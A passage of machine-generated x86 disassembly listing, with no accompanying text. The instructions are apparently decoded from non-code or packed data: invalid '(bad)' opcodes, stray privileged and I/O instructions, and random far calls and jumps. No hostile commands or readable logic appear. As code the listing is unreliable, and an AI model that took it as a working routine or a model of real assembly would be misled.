  428c5a:	call   0xbbc:0x947ff5ff
  428c61:	push   0x35884638
  428c66:	mov    DWORD PTR [ecx+eax*1+0xff00],esi
  428c6d:	add    BYTE PTR [edx-0x3ae1d6b9],ah
  428c73:	jbe    0x428ca9
  428c75:	aaa    
  428c76:	aas    
  428c77:	js     0x428cec
  428c79:	xor    DWORD PTR [ebp+0x487aa4d1],esp
  428c7f:	xchg   ebp,eax
  428c80:	pop    ds
  428c81:	fimul  WORD PTR [ecx]
  428c83:	cld    
  428c84:	(bad)  
  428c85:	in     al,dx
  428c86:	mov    ebp,DWORD PTR [ecx-0x2b]
  428c89:	jne    0x428c30
  428c8b:	mov    ds:0x9d0f20f6,al
  428c90:	adc    al,0xba
  428c92:	cmp    dl,bl
  428c94:	jg     0x428cdc
  428c96:	push   eax
  428c97:	push   ds
  428c98:	push   es
  428c99:	xchg   ebx,eax
  428c9a:	push   ds
  428c9b:	out    0x33,al
  428c9d:	icebp  
  428c9e:	test   BYTE PTR [edx+0x57],bl
  428ca1:	pop    edx
  428ca2:	(bad)  
  428ca3:	push   ebx
  428ca4:	stos   DWORD PTR es:[edi],eax
  428ca5:	imul   esi,ebp,0xffffff81
  428ca8:	fcom   DWORD PTR [ecx-0x407747ef]
  428cae:	out    0x3a,eax
  428cb0:	sar    BYTE PTR [eax+0x424e179],0xe9
  428cb7:	ins    DWORD PTR es:[edi],dx
  428cb8:	cmp    edx,DWORD PTR [ecx-0x2632c457]
  428cbe:	mov    WORD PTR [ebx+eax*8+0x3a],ds
  428cc2:	or     DWORD PTR [eax],edi
  428cc4:	loope  0x428c6d
  428cc6:	and    eax,DWORD PTR [ebx]
  428cc8:	cmp    ebp,DWORD PTR [edx+0x69]
  428ccb:	iret   
  428ccc:	xor    al,0xe1
  428cce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428ccf:	mov    ebp,es
  428cd1:	int3   
  428cd2:	push   ebp
  428cd3:	fstp   TBYTE PTR [eax]
  428cd5:	popf   
  428cd6:	loope  0x428d25
  428cd8:	inc    esp
  428cd9:	test   eax,0xd6223061
  428cde:	and    esi,eax
  428ce0:	pop    ecx
  428ce1:	call   0xcfd:0x609169d6
  428ce8:	or     edi,esp
  428cea:	les    ecx,FWORD PTR [ebx-0x6a]
  428ced:	cmp    edi,DWORD PTR [edx+ebp*8-0x49]
  428cf1:	pop    ss
  428cf2:	xchg   DWORD PTR ds:0x6bbff05e,ebp
  428cf8:	and    eax,0x98f3749b
  428cfd:	cmp    BYTE PTR [edi],al
  428cff:	and    bh,BYTE PTR [ecx+0x2157d752]
  428d05:	cli    
  428d06:	adc    DWORD PTR [ebx-0xf],edi
  428d09:	xchg   ecx,eax
  428d0a:	sbb    dl,BYTE PTR [eax-0x65]
  428d0d:	cmp    dl,ah
  428d0f:	je     0x428c93
  428d11:	sub    ebp,DWORD PTR [ecx-0x18]
  428d14:	(bad)  
  428d15:	mov    bl,0x9e
  428d17:	scas   al,BYTE PTR es:[edi]
  428d18:	pusha  
  428d19:	in     eax,dx
  428d1a:	cmp    ecx,DWORD PTR [ebx-0x3c5d2fee]
  428d20:	ins    DWORD PTR es:[edi],dx
  428d21:	sbb    al,0xd2
  428d23:	ror    BYTE PTR [ecx+0x3a],cl
  428d26:	mov    dh,0x6b
  428d28:	int    0xa7
  428d2a:	ds inc edi
  428d2c:	mov    BYTE PTR [bx+di-0x694e],dl
  428d31:	adc    eax,0xb2ad0a2a
  428d36:	adc    DWORD PTR [ebp-0x57a5248e],ebp
  428d3c:	ror    BYTE PTR [ecx+0x2f6558f8],cl
  428d42:	mov    dl,0x82
  428d44:	jl     0x428d8a
  428d46:	jo     0x428d5d
  428d48:	bound  edi,QWORD PTR [ecx-0x54]
  428d4b:	pop    es
  428d4c:	add    al,ah
  428d4e:	and    BYTE PTR [ecx-0x47ffe3c5],dl
  428d54:	inc    esp
  428d55:	fs loope 0x428d14
  428d58:	test   eax,0x840904fd
  428d5d:	fidivr WORD PTR [ebx-0x651fc54e]
  428d63:	xor    DWORD PTR ds:0x230be35f,0x37b90ce
	...
  428dd5:	add    BYTE PTR [ecx-0xace0e4b],al
  428ddb:	jne    0x428d9e
  428ddd:	mov    ch,0x90
  428ddf:	int3   
  428de0:	ins    BYTE PTR es:[edi],dx
  428de1:	retf   0x13c
  428de4:	(bad)  
  428de6:	mov    BYTE PTR [ebp+0xff0001],dh
  428dec:	add    BYTE PTR [eax],al
  428dee:	jns    0x428e6d
  428df0:	sbb    ecx,ecx
  428df2:	sub    al,0x18
  428df4:	jbe    0x428e12
  428df6:	loope  0x428db5
  428df8:	mov    ch,0x23
  428dfa:	mov    bl,0xca
  428dfc:	in     al,0x52
  428dfe:	std    
  428dff:	cmp    eax,0xb3084f7a
  428e04:	add    cl,bl
  428e06:	push   esp
  428e07:	dec    esp
  428e08:	mov    eax,ds:0xf615ef80
  428e0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428e0e:	sub    BYTE PTR [ebx],ch
  428e10:	std    
  428e11:	adc    eax,0x3d622883
  428e16:	cdq    
  428e17:	mov    ecx,eax
  428e19:	add    edi,esi
  428e1b:	xchg   ebx,eax
  428e1c:	mov    esp,0x318054d9
  428e21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428e22:	hlt    
  428e23:	add    ebx,ebx
  428e25:	test   BYTE PTR ds:0xe2b1dfea,ah
  428e2b:	es int3 
  428e2d:	sbb    ebx,DWORD PTR [esi-0x15]
  428e30:	lahf   
  428e31:	xor    BYTE PTR [eax-0x194d9e87],bl
  428e37:	push   ds
  428e38:	fld    QWORD PTR ds:0x5a9fe2f7
  428e3e:	jo     0x428e6d
  428e40:	dec    ebp
  428e41:	adc    bl,bh
  428e43:	scas   al,BYTE PTR es:[edi]
  428e44:	cmp    al,BYTE PTR [esi]
  428e46:	cld    
  428e47:	shl    ebp,0x43
  428e4a:	and    sp,0x12
  428e4e:	jne    0x428e0c
  428e50:	push   esp
  428e51:	out    dx,eax
  428e52:	mov    esp,0x9ae016cc
  428e57:	addr16 mov eax,0xde2989ac
  428e5d:	and    al,0xd5
  428e5f:	push   ebx
  428e60:	mov    ds:0xf6953955,eax
  428e65:	sbb    al,0x61
  428e67:	jle    0x428e70
  428e69:	pop    ds
  428e6a:	repnz mov bh,0x35
  428e6d:	push   ecx
  428e6e:	xor    al,0x31
  428e70:	inc    esi
  428e71:	mov    edx,DWORD PTR [eax]
  428e73:	loop   0x428e32
  428e75:	call   ecx
  428e77:	aad    0x4d
  428e79:	stos   DWORD PTR es:[edi],eax
  428e7a:	repnz mov edx,0x121dd24b
  428e80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428e81:	pop    edx
  428e82:	pop    es
  428e83:	push   ebx
  428e84:	xor    dh,BYTE PTR [ecx-0x4b]
  428e87:	inc    edx
  428e88:	gs mov ebp,0x59fd33d8
  428e8e:	addr16 mov bh,dh
  428e91:	cmp    BYTE PTR [edi],0x7f
  428e94:	sub    eax,0xcdba41ea
  428e99:	sub    ecx,DWORD PTR [ecx-0x9]
  428e9c:	icebp  
  428e9d:	loope  0x428ea7
  428e9f:	jne    0x428e6d
  428ea1:	push   0x71
  428ea3:	cdq    
  428ea4:	sub    eax,0x48ede110
  428ea9:	push   ecx
  428eaa:	mov    edi,0x8b92a492
  428eaf:	pop    ss
  428eb0:	outs   dx,DWORD PTR ds:[esi]
  428eb1:	lds    eax,FWORD PTR [ebp+0x727e5faa]
  428eb7:	test   al,0x2d
  428eb9:	xor    ecx,edi
  428ebb:	gs adc ecx,esi
  428ebe:	(bad)  
  428ebf:	stc    
  428ec0:	sub    ah,bh
  428ec2:	nop
  428ec3:	aaa    
  428ec4:	push   ebx
  428ec5:	stc    
  428ec6:	jp     0x428e8b
  428ec8:	pop    ecx
  428ec9:	and    bl,BYTE PTR [ebx]
  428ecb:	sub    al,0xa7
  428ecd:	xchg   ebp,eax
  428ece:	into   
  428ecf:	fs jmp 0x985b5ce9
  428ed5:	(bad)  
  428ed6:	mov    edx,0xe0a87456
  428edb:	cmp    edi,DWORD PTR [ecx]
  428edd:	addr16 pushf 
  428edf:	pop    ecx
  428ee0:	fst    QWORD PTR [ebx+eiz*4-0x5ed71957]
  428ee7:	dec    eax
  428ee8:	jge    0x428f66
  428eea:	sbb    ecx,DWORD PTR [ecx]
  428eec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  428f55:	add    BYTE PTR [edi+0x5d],cl
  428f58:	pop    ecx
  428f59:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428f5d:	fstp   st(1)
  428f5f:	ror    DWORD PTR [esp+edx*4],0x2
  428f63:	pop    ebx
  428f64:	aam    0xd2
  428f66:	xchg   DWORD PTR [esi+0xff0001],esi
  428f6c:	add    BYTE PTR [eax],al
  428f6e:	shl    BYTE PTR [ebp-0x19],cl
  428f71:	adc    eax,0xbdf44462
  428f76:	iret   
  428f77:	dec    esi
  428f78:	es or  eax,0x1ae7510f
  428f7e:	mov    ah,0xc1
  428f80:	stos   BYTE PTR es:[edi],al
  428f81:	xlat   BYTE PTR ds:[ebx]
  428f82:	stos   BYTE PTR es:[edi],al
  428f83:	inc    ebp
  428f84:	test   BYTE PTR [edi-0x1c1d2d43],ah
  428f8a:	je     0x428f59
  428f8c:	xchg   ebp,eax
  428f8d:	test   DWORD PTR [edi-0x15],esp
  428f90:	add    DWORD PTR [ecx-0x1d34cf9],ebp
  428f96:	or     eax,0x782c6f76
  428f9b:	mov    esp,0x23f60c10
  428fa0:	push   0x986180be
  428fa5:	aad    0xac
  428fa7:	lods   eax,DWORD PTR ds:[esi]
  428fa8:	repnz push edx
  428faa:	adc    bl,BYTE PTR [esp+edx*2+0x47ec07a7]
  428fb1:	mov    ch,0xb
  428fb3:	sub    al,0x1c
  428fb5:	pop    edi
  428fb6:	daa    
  428fb7:	push   cs
  428fb8:	dec    edx
  428fb9:	inc    edx
  428fba:	xor    eax,0x858483f9
  428fbf:	(bad)  [edi+eiz*4-0x461ae5ee]
  428fc6:	test   DWORD PTR [ebx],esp
  428fc8:	and    DWORD PTR ds:0x64bff13e,edx
  428fce:	pusha  
  428fcf:	mov    BYTE PTR [di-0x46],dh
  428fd3:	add    eax,0x34830c75
  428fd8:	or     eax,0xd451b8c1
  428fdd:	sbb    esp,ebx
  428fdf:	jae    0x428f73
  428fe1:	into   
  428fe2:	sub    esp,DWORD PTR [ebx+0x36456c74]
  428fe8:	sahf   
  428fe9:	sbb    eax,0xe1b03637
  428fee:	ret    0x1fed
  428ff1:	mov    dh,0x6d
  428ff3:	not    BYTE PTR [edx+0x8dec71a]
  428ff9:	mov    ?,edx
  428ffb:	pop    esp
  428ffc:	into   
  428ffd:	cmp    cl,bh
  428fff:	and    cl,BYTE PTR [edi+0x65d418b2]
  429005:	aam    0xa5
  429007:	push   0x2a
  429009:	sub    BYTE PTR [ebx-0x1105c566],dl
  42900f:	xor    sp,WORD PTR [ebp-0x56]
  429013:	pop    eax
  429014:	out    dx,eax
  429015:	inc    esi
  429016:	push   esi
  429017:	fisub  DWORD PTR [ecx+ebp*1-0x4b]
  42901b:	test   BYTE PTR [ebx+ecx*8+0x2d],0x5b
  429020:	sbb    eax,0x8437a3e8
  429025:	jmp    0x537f18f0
  42902a:	or     DWORD PTR [ecx+0x4b988283],ecx
  429030:	xchg   esi,eax
  429031:	outs   dx,DWORD PTR ss:[esi]
  429033:	mov    edi,0x9185433f
  429038:	xchg   BYTE PTR [ebp-0x3d],dh
  42903b:	xor    ah,BYTE PTR [ebp-0x6a]
  42903e:	inc    edi
  42903f:	xor    eax,0xbd8e0bc4
  429044:	outs   dx,DWORD PTR ds:[esi]
  429045:	and    al,0x2c
  429047:	inc    DWORD PTR [ecx]
  429049:	arpl   WORD PTR [edi-0x61],si
  42904c:	cdq    
  42904d:	sub    BYTE PTR [ecx],cl
  42904f:	jge    0x429050
  429051:	jl     0x429058
  429053:	mov    ds:0x1a48f492,eax
  429058:	sub    BYTE PTR [edx],bl
  42905a:	imul   ecx,DWORD PTR [eax-0x7e0378b0],0xffffffb6
  429061:	outs   dx,DWORD PTR ds:[esi]
  429062:	dec    ecx
  429063:	(bad)  
  429064:	mov    dl,0x85
  429066:	xor    eax,0x7160e4a7
  42906b:	pop    eax
  42906c:	dec    edi
	...
  4290d5:	add    cl,ah
  4290d7:	in     al,dx
  4290d8:	mov    ebx,es
  4290da:	(bad)  
  4290db:	jecxz  0x4290cc
  4290dd:	out    dx,al
  4290de:	mov    edi,0x15fc7b77
  4290e3:	cs push ebp
  4290e5:	mov    al,ds:0x1b786
  4290ea:	inc    DWORD PTR [eax]
  4290ec:	add    BYTE PTR [eax],al
  4290ee:	sub    eax,0xb3b6f8af
  4290f3:	push   0x273ed8d1
  4290f8:	dec    edi
  4290f9:	jbe    0x429169
  4290fb:	retf   
  4290fc:	sbb    al,0x2a
  4290fe:	jb     0x42912a
  429100:	pop    esi
  429101:	int    0x45
  429103:	sub    eax,0x60930bc9
  429108:	xor    dh,BYTE PTR [esi+0x39bb642b]
  42910e:	dec    edx
  42910f:	dec    edi
  429110:	ror    DWORD PTR [ecx+0x5deebc9d],cl
  429116:	adc    ah,BYTE PTR [edx+0x32]
  429119:	jnp    0x429131
  42911b:	jmp    0x4290d8
  42911d:	inc    ebx
  42911e:	xor    edx,ecx
  429120:	xchg   ecx,eax
  429121:	dec    eax
  429122:	ja     0x42911f
  429124:	mov    bh,0xbc
  429126:	xchg   edi,eax
  429127:	xchg   edi,eax
  429128:	inc    ebp
  429129:	xchg   ecx,eax
  42912a:	dec    ebp
  42912b:	cli    
  42912c:	and    BYTE PTR [ebp+0xe605cb7],ah
  429132:	dec    ecx
  429133:	fld    TBYTE PTR [edx]
  429135:	(bad)  
  429136:	fisub  WORD PTR [esi]
  429138:	mov    eax,0x5b136e9f
  42913d:	mov    ecx,0xbfa7de34
  429142:	je     0x4290d6
  429144:	jg     0x42912f
  429146:	push   edi
  429147:	push   0xe797f5b
  42914c:	je     0x4290ea
  42914e:	mov    ecx,0xa118fc6
  429153:	stos   BYTE PTR es:[edi],al
  429154:	inc    esp
  429155:	addr16 mov esi,0x95f5170
  42915b:	push   eax
  42915c:	jle    0x429188
  42915e:	lods   eax,DWORD PTR ds:[esi]
  42915f:	inc    edi
  429160:	mov    esp,0xa2e10c56
  429165:	shl    ebx,cl
  429167:	add    al,0x82
  429169:	les    ebx,FWORD PTR [esi-0x5205cff3]
  42916f:	mov    ebp,DWORD PTR [ebp-0x6987a9b1]
  429175:	pop    ds
  429176:	sahf   
  429177:	inc    edx
  429178:	sub    al,0x1e
  42917a:	jo     0x429110
  42917c:	lahf   
  42917d:	mov    ecx,0xa5fbe8b5
  429182:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429183:	mov    eax,0xaa2fc420
  429188:	jle    0x4291ea
  42918a:	sub    DWORD PTR [ebx+0x18],eax
  42918d:	popf   
  42918e:	sbb    edi,DWORD PTR [edx-0x79a1f728]
  429194:	icebp  
  429195:	add    al,0xde
  429197:	mov    bh,0x9a
  429199:	call   0x6f0d:0xedf9c26a
  4291a0:	lock repz sahf 
  4291a3:	mov    ebx,0x2b66851c
  4291a8:	pop    esi
  4291a9:	push   0x86dc9323
  4291ae:	jmp    0x8c7422f1
  4291b3:	xchg   edi,eax
  4291b4:	sbb    al,0x94
  4291b6:	sub    eax,0xe358a09a
  4291bb:	mov    edi,0x95733450
  4291c0:	cmc    
  4291c1:	mov    edx,0x327798e
  4291c6:	push   es
  4291c7:	in     eax,dx
  4291c8:	or     ebx,ebp
  4291ca:	pop    ss
  4291cb:	loop   0x429239
  4291cd:	jge    0x429208
  4291cf:	in     al,0x50
  4291d1:	dec    eax
  4291d2:	and    edi,DWORD PTR ds:0xbe3e55a6
  4291d8:	pop    edx
  4291d9:	push   cs
  4291da:	daa    
  4291db:	rcl    DWORD PTR [ecx],0x93
  4291de:	and    DWORD PTR [esi-0x57],edx
  4291e1:	xchg   bl,ah
  4291e3:	inc    eax
  4291e4:	adc    ebx,DWORD PTR [ebx]
  4291e6:	mov    al,0xc
  4291e8:	and    eax,0x3cd52e2a
	...
  429255:	add    BYTE PTR [esi-0x79],dl
  429258:	std    
  429259:	test   ch,bh
  42925b:	(bad)  
  42925c:	jg     0x429235
  42925e:	into   
  42925f:	retf   
  429260:	or     DWORD PTR [ebp+eax*8-0x7a70b256],0xff0001b8
  42926b:	add    BYTE PTR [eax],al
  42926d:	add    BYTE PTR [ebp-0x6b],cl
  429270:	shl    BYTE PTR [esi-0x78818ca3],cl
  429276:	jmp    0x7d14:0xb9adbb23
  42927d:	not    DWORD PTR [eax+0x42]
  429280:	cmp    al,0xa1
  429282:	inc    esi
  429283:	imul   ebx,DWORD PTR ds:0xc818338b,0x77
  42928a:	nop
  42928b:	fidivr DWORD PTR [ebp+edx*4-0x11f97c69]
  429292:	dec    ecx
  429293:	ss jb  0x429265
  429296:	fdiv   QWORD PTR [eax]
  429298:	(bad)  
  429299:	rol    ecx,cl
  42929b:	stos   BYTE PTR es:[edi],al
  42929c:	mov    dl,0x53
  42929e:	and    bl,BYTE PTR [ebx+0x1204a5d3]
  4292a4:	imul   esp,DWORD PTR [eax],0xffffffcd
  4292a7:	mov    ebp,0x7b56dc9e
  4292ac:	sub    DWORD PTR [ecx],ecx
  4292ae:	fdivr  QWORD PTR [ecx-0x7e81590]
  4292b4:	mov    eax,eax
  4292b6:	stc    
  4292b7:	dec    ecx
  4292b8:	mov    ecx,0xc9b2113e
  4292bd:	fisttp WORD PTR [esi+0x19]
  4292c0:	mov    ah,0xea
  4292c2:	dec    ebp
  4292c3:	mov    al,0x3
  4292c5:	rcr    BYTE PTR [ebx],1
  4292c7:	push   esi
  4292c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4292c9:	or     al,0x64
  4292cb:	xor    BYTE PTR [ecx-0x31],dh
  4292ce:	sbb    DWORD PTR [bx+di],0x75
  4292d2:	ret    0xfc4f
  4292d5:	dec    ebx
  4292d6:	(bad)  
  4292d7:	pushf  
  4292d8:	es fs xor al,0xe7
  4292dc:	mov    eax,ds:0x117da1cd
  4292e1:	lock xchg BYTE PTR [edi-0x7205c717],ch
  4292e8:	rep lods al,BYTE PTR ds:[esi]
  4292ea:	xchg   edi,eax
  4292eb:	or     DWORD PTR [eax],edi
  4292ed:	loop   0x429304
  4292ef:	jmp    0x357bfc39
  4292f4:	adc    esi,DWORD PTR [edx-0x50]
  4292f7:	xchg   ebp,eax
  4292f8:	add    ch,dh
  4292fa:	xchg   edx,eax
  4292fb:	push   esi
  4292fc:	sub    bl,BYTE PTR [ebx+0x31d916d9]
  429302:	jb     0x42932c
  429304:	add    eax,0xaa5bd7db
  429309:	cdq    
  42930a:	or     al,BYTE PTR [eax+0x5b]
  42930d:	xchg   DWORD PTR [ecx],eax
  42930f:	add    esi,DWORD PTR [esi-0x37]
  429312:	adc    ch,BYTE PTR [ecx]
  429314:	mov    ah,0x30
  429316:	jae    0x42936e
  429318:	sbb    eax,0x8d7b8861
  42931d:	push   edx
  42931e:	xchg   BYTE PTR [ebp-0x64],dh
  429321:	mov    ebx,0xc79bb23a
  429326:	push   ecx
  429327:	call   0x2c2c:0x41b32241
  42932e:	push   edx
  42932f:	pop    ecx
  429330:	in     eax,dx
  429331:	(bad)  
  429332:	repz int3 
  429334:	ja     0x429339
  429336:	hlt    
  429337:	pop    esp
  429338:	int    0x5e
  42933a:	pushf  
  42933b:	mov    edi,0x5c662ae
  429340:	and    eax,0xb600aeee
  429345:	mov    ecx,0xb8774bea
  42934a:	xchg   DWORD PTR [ebx],eax
  42934c:	dec    eax
  42934d:	sub    BYTE PTR [edx+0x33],dh
  429350:	mov    esi,0x6141b204
  429355:	iret   
  429356:	jo     0x42934d
  429358:	cmp    al,0xf1
  42935a:	out    dx,al
  42935b:	pop    DWORD PTR [ebp+eiz*8+0x2a]
  42935f:	and    BYTE PTR [eax-0x75678908],cl
  429365:	adc    ah,bl
  429367:	xor    BYTE PTR [edx-0x5b],bh
  42936a:	mov    cl,bl
  42936c:	add    DWORD PTR [eax],eax
	...
  4293d6:	lock adc al,0xe1
  4293d9:	(bad)  
  4293da:	in     eax,0xff
  4293dc:	call   FWORD PTR [esi]
  4293de:	jae    0x4293e5
  4293e0:	dec    edx
  4293e1:	mov    bh,0x75
  4293e3:	push   ebp
  4293e4:	fistp  QWORD PTR [ebx+0x1b984]
  4293ea:	inc    DWORD PTR [eax]
  4293ec:	add    BYTE PTR [eax],al
  4293ee:	mov    ecx,0x7a809853
  4293f3:	stc    
  4293f4:	cdq    
  4293f5:	ds test cl,0xd7
  4293f9:	pop    esi
  4293fa:	sub    ah,ch
  4293fc:	inc    ebp
  4293fd:	cmp    esi,DWORD PTR [eax+esi*2]
  429400:	loope  0x4293bd
  429402:	push   ecx
  429403:	mov    BYTE PTR [ecx+0x5aaae333],0xd9
  42940a:	(bad)  
  42940b:	xchg   ebx,eax
  42940c:	mov    cl,0x2
  42940e:	jmp    0x709dcbd6
  429413:	enter  0x7832,0x8
  429417:	aas    
  429418:	lods   eax,DWORD PTR ds:[esi]
  429419:	aas    
  42941a:	arpl   WORD PTR [edx],dx
  42941c:	sub    eax,0xef123d9b
  429421:	xor    esi,DWORD PTR [esi-0x3a90c51]
  429427:	gs sahf 
  429429:	mov    ebp,0xcbecf822
  42942e:	mov    ch,0x45
  429430:	xor    eax,0xc10f07a2
  429435:	or     BYTE PTR [edi-0x17],al
  429438:	xor    ch,BYTE PTR [ebx]
  42943a:	jae    0x429451
  42943c:	out    0x99,eax
  42943e:	cli    
  42943f:	sbb    dh,0x95
  429442:	in     al,0xf5
  429444:	jae    0x4294a4
  429446:	cdq    
  429447:	popa   
  429448:	push   ds
  429449:	lods   eax,DWORD PTR ds:[esi]
  42944a:	adc    esp,DWORD PTR [ebx+esi*1]
  42944d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42944e:	out    dx,al
  42944f:	and    eax,0x7bdf9e9c
  429454:	popa   
  429455:	ss jge 0x4294c7
  429458:	dec    ecx
  429459:	xchg   edx,eax
  42945a:	pop    ecx
  42945b:	mov    bh,0x86
  42945d:	call   0x7127c9e1
  429462:	mov    eax,ds:0x99f83422
  429467:	cdq    
  429468:	js     0x4294a6
  42946a:	(bad)  [edi]
  42946c:	mov    edi,0xec7a2c42
  429471:	jns    0x4294c7
  429473:	dec    esp
  429474:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429475:	mov    ecx,0x5d13780a
  42947a:	out    0x2f,al
  42947c:	enter  0xcc95,0xcc
  429480:	pushf  
  429481:	xchg   edi,eax
  429482:	pop    esi
  429483:	dec    ecx
  429484:	jae    0x4294f1
  429486:	and    BYTE PTR [esi-0x56],cl
  429489:	icebp  
  42948a:	lahf   
  42948b:	cdq    
  42948c:	cs pusha 
  42948e:	adc    ebp,DWORD PTR [eax]
  429490:	or     ah,BYTE PTR [esi]
  429492:	dec    esp
  429493:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429494:	cmc    
  429495:	mov    dh,0x73
  429497:	lds    ebp,FWORD PTR [esi+0x16]
  42949a:	(bad)  
  42949b:	fcom   DWORD PTR [esi]
  42949d:	rol    DWORD PTR [ebx-0x72],1
  4294a0:	push   ecx
  4294a1:	dec    eax
  4294a2:	bound  esp,QWORD PTR [edi]
  4294a4:	adc    al,0x28
  4294a6:	sub    DWORD PTR [eax+0x2f80db13],ecx
  4294ac:	ins    DWORD PTR es:[edi],dx
  4294ad:	test   eax,0x5be4fd3c
  4294b2:	ins    DWORD PTR es:[edi],dx
  4294b3:	pushf  
  4294b4:	push   ebx
  4294b5:	and    al,0x4a
  4294b7:	mov    WORD PTR ds:[edx+edx*4-0x458d4a53],es
  4294bf:	pop    esp
  4294c0:	adc    esp,edi
  4294c2:	shl    eax,cl
  4294c4:	clc    
  4294c5:	or     eax,0x1f7fe07f
  4294ca:	xor    al,0xb6
  4294cc:	add    BYTE PTR [edx],ah
  4294ce:	sub    BYTE PTR [esi+0x19],dl
  4294d1:	sub    ch,BYTE PTR [edx]
  4294d3:	dec    esp
  4294d4:	jecxz  0x429518
  4294d6:	scas   eax,DWORD PTR es:[edi]
  4294d7:	push   eax
  4294d8:	ins    DWORD PTR es:[edi],dx
  4294d9:	mov    dh,0xba
  4294db:	push   0x7a
  4294dd:	dec    ebx
  4294de:	fisttp DWORD PTR [esi+0x50]
  4294e1:	in     eax,0x54
  4294e3:	lea    edx,[esi+0x4eda15d8]
  4294e9:	jb     0x429500
  4294eb:	pop    eax
  4294ec:	cmc    
	...
  429555:	add    BYTE PTR [ebp+ecx*1+0x13],cl
  429559:	sub    al,0x53
  42955b:	ds jg  0x4295cb
  42955e:	dec    esp
  42955f:	arpl   WORD PTR [ebp+0x1af67dea],dx
  429565:	bound  eax,QWORD PTR [ebx-0xfffe46]
  42956b:	add    BYTE PTR [eax],al
  42956d:	add    al,dl
  42956f:	es dec esp
  429571:	ret    0x320
  429574:	mov    DWORD PTR [edi-0x71],edi
  429577:	xor    DWORD PTR [edx+0x72],ebx
  42957a:	leave  
  42957b:	shr    bl,0x3d
  42957e:	xor    ecx,edx
  429580:	in     eax,0x53
  429582:	push   ebp
  429583:	push   0x8db7e804
  429588:	aas    
  429589:	test   esi,ecx
  42958b:	enter  0xf03,0x0
  42958f:	loop   0x429516
  429591:	mov    edx,DWORD PTR [eax]
  429593:	aad    0xd2
  429595:	adc    BYTE PTR [ebp+0x4862e478],ch
  42959b:	aam    0xe4
  42959d:	push   edi
  42959e:	xor    ebx,DWORD PTR [ebx+0x201e48e7]
  4295a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4295a6:	pusha  
  4295a7:	add    dl,BYTE PTR [ecx-0x1fa8545e]
  4295ad:	sub    al,0xf9
  4295af:	sub    al,0xe0
  4295b2:	test   BYTE PTR [ebx],dl
  4295b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4295b5:	xchg   esp,eax
  4295b6:	adc    BYTE PTR [edx-0x3],bl
  4295b9:	sub    dl,BYTE PTR [edx]
  4295bb:	dec    eax
  4295bc:	xor    bl,BYTE PTR [edx-0x6acd8627]
  4295c2:	mov    eax,ds:0xda96b676
  4295c7:	sbb    esi,eax
  4295c9:	fwait
  4295ca:	mov    bh,0xbb
  4295cc:	jg     0x42963d
  4295ce:	jecxz  0x429606
  4295d0:	mov    DWORD PTR [eax-0x63],eax
  4295d3:	call   0xaf3ebf20
  4295d8:	iret   
  4295d9:	push   edi
  4295da:	fwait
  4295db:	jb     0x4295ba
  4295dd:	out    dx,al
  4295de:	sbb    eax,0x12708d8b
  4295e3:	mov    ds:0x21e96405,eax
  4295e8:	shl    BYTE PTR [eax+0x4a],0x73
  4295ec:	bnd jo 0x4295a2
  4295ef:	mov    al,ds:0xa6d9df0f
  4295f4:	dec    esp
  4295f5:	mov    al,0x64
  4295f7:	push   es
  4295f8:	or     esp,DWORD PTR [edi]
  4295fa:	or     al,0x4f
  4295fc:	fbstp  TBYTE PTR [ebp-0x565c7db1]
  429602:	enter  0x5d67,0x49
  429606:	push   es
  429607:	fld    QWORD PTR [ecx+0x45882aa3]
  42960d:	mov    gs,WORD PTR [edx-0x4db29f8b]
  429613:	into   
  429614:	sbb    ah,BYTE PTR [edx+0x45]
  429617:	mov    esi,0x598a000b
  42961c:	push   DWORD PTR [eax]
  42961e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42961f:	add    esp,edx
  429621:	push   edx
  429622:	xor    ch,0xb5
  429625:	hlt    
  429626:	popf   
  429627:	popa   
  429628:	stc    
  429629:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42962a:	fcomp  QWORD PTR [edx+0x53e6dafd]
  429630:	fstp   TBYTE PTR [esi]
  429632:	xchg   ecx,eax
  429633:	leave  
  429634:	out    dx,eax
  429635:	inc    esp
  429636:	repz jnp 0x42963d
  429639:	popa   
  42963a:	or     ebp,ecx
  42963c:	fild   QWORD PTR [eax-0x27]
  42963f:	mov    BYTE PTR [ebx],bl
  429641:	out    dx,al
  429642:	sbb    BYTE PTR [ecx+0x8886eb3],bh
  429648:	int3   
  429649:	mov    ebp,0xd7060887
  42964e:	dec    edx
  42964f:	out    dx,al
  429650:	cli    
  429651:	data16 stc 
  429653:	repz div DWORD PTR [ebp-0x4978d430]
  42965a:	sub    al,0xcb
  42965c:	cmp    DWORD PTR [ecx-0x5042ae7a],edx
  429662:	jp     0x429666
  429664:	stc    
  429665:	and    al,0x79
  429667:	or     ah,cl
  429669:	add    esi,DWORD PTR [edi-0x59]
  42966c:	jne    0x42966e
	...
  4296d6:	ins    DWORD PTR es:[edi],dx
  4296d7:	sbb    eax,0xfbf6c0e6
  4296dc:	outs   dx,DWORD PTR ds:[esi]
  4296dd:	mov    ebp,0xab7b5cea
  4296e2:	mov    es,ecx
  4296e4:	bound  ecx,QWORD PTR [ecx-0x7e]
  4296e7:	mov    ebx,0xff0001
  4296ec:	add    BYTE PTR [eax],al
  4296ee:	sbb    ecx,edi
  4296f0:	sti    
  4296f1:	add    ebp,esp
  4296f3:	test   BYTE PTR [esi+0x16],0xb2
  4296f7:	scas   al,BYTE PTR es:[edi]
  4296f8:	popf   
  4296f9:	aas    
  4296fa:	push   edx
  4296fb:	inc    ebx
  4296fc:	addr16 rol ebx,cl
  4296ff:	sbb    al,0xa8
  429701:	mov    eax,0x2a2769f6
  429706:	out    dx,al
  429707:	fnsave [edi-0x50015371]
  42970d:	mov    ds:0x2802de8f,eax
  429713:	xor    BYTE PTR [edi],cl
  429715:	out    0x9f,eax
  429717:	cmc    
